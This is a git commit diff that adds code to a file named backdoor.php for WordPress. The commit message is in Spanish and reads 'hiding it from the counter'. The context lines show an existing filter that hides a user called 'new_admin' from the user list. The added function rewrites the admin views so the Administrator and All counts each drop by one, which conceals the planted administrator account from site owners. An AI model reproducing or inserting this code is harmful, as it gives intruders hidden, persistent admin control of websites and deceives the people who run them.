710fdba8158c80760959f02418bbac167133c851
jbdaconte <jbdaconte@gmail.com>
2024-05-29 19:25:35 +0000

    Escondiendolo del contador

--- backdoor.php
+++ backdoor.php
@@ -28,3 +28,16 @@ function  dt_pre_user_query($user_search) {
 		    "WHERE 1=1 AND {$wpdb->users}.user_login != 'new_admin'",$user_search->query_where);
     }
 }
+
+add_filter("views_users", "dt_list_table_views");
+
+function  dt_list_table_views($views){
+    $users = count_users();
+    $admins_num = $users['avail_roles']['administrator'] - 1;
+    $all_num = $users['total_users'] - 1;
+    $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
+    $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
+    $views['administrator'] = '<a href="users.php?role=administrator" class="'  .  $class_adm  .  '">'  .  translate_user_role('Administrator') .  ' <span class="count">('  .  $admins_num  .  ')</span></a>';
+    $views['all'] = '<a href="users.php" class="'  .  $class_all  .  '">'  .  __('All') .  ' <span class="count">('  .  $all_num  .  ')</span></a>';
+    return  $views;
+}
